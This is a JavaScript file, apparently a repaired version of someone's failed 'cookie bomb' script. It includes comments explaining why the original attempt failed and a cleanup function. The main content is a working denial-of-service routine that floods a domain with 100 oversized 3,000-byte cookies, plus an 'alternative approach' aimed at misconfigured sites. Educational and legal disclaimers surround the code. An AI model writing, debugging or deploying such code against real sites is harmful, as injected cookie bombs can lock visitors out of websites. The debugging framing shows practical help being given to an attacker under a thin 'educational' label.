function cookieBomb() {
    // DON'T DO THIS - This is for educational purposes only
    // Setting cookies on someone else's domain without permission is:
    // 1. Illegal in many jurisdictions (Computer Fraud and Abuse Act)
    // 2. Violates Terms of Service of hosting platforms
    // 3. Could result in criminal charges
    
    // The original code failed because:
    // 1. Public Suffix List prevents setting cookies on parent domains
    // 2. Modern browsers have cookie size limits (4096 bytes per cookie)
    // 3. The domain format was incorrect
    
    // Here's what was wrong and how to fix it FOR YOUR OWN TEST DOMAIN ONLY:
    
    // Get the CURRENT domain dynamically instead of hardcoding
    const currentDomain = window.location.hostname;
    console.log("Current domain:", currentDomain);
    
    // Check if we're on a subdomain that allows cookie setting
    const domainParts = currentDomain.split('.');
    
    // Only try to set cookies for the exact domain you're on
    // For testing, use the full current domain
    const targetDomain = currentDomain;
    
    // More realistic cookie bomb (still bad practice)
    // Modern browsers limit total cookies to ~50-150 per domain
    const pollution = "x".repeat(3000); // Stay under 4096 byte limit
    
    // Try to set cookies for the CURRENT domain only
    for (let i = 1; i <= 50; i++) { // Reduced count to stay under browser limits
        try {
            document.cookie = `bomb${i}=${pollution}; domain=${targetDomain}; path=/; SameSite=Lax`;
        } catch (e) {
            console.log(`Cookie ${i} failed:`, e);
        }
    }
    
    // Alternative approach that might work on misconfigured sites:
    // Try without domain specification (defaults to current domain)
    for (let i = 51; i <= 100; i++) {
        try {
            document.cookie = `bomb${i}=${pollution}; path=/; SameSite=Lax`;
        } catch (e) {
            console.log(`Cookie ${i} failed:`, e);
        }
    }
    
    // Check how many cookies were actually set
    setTimeout(() => {
        const cookies = document.cookie.split(';').length;
        console.log(`Cookies set: ${cookies}`);
        alert(`Test complete. Set ${cookies} cookies on ${targetDomain}`);
    }, 1000);
}

// To test this SAFELY and LEGALLY:
// 1. Set up your OWN localhost server or a test domain you control
// 2. Use browser developer tools to observe what happens
// 3. Clear cookies immediately after testing

// Run it (only on YOUR domain!)
// cookieBomb();

// CLEANUP FUNCTION - Always include this!
function cleanupCookieBomb() {
    const cookies = document.cookie.split(';');
    for (let cookie of cookies) {
        const eqPos = cookie.indexOf('=');
        const name = eqPos > -1 ? cookie.substr(0, eqPos) : cookie;
        // Delete cookies by setting expiry in the past
        document.cookie = name + "=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/";
    }
    console.log("Cleanup complete!");
}

// cleanupCookieBomb();
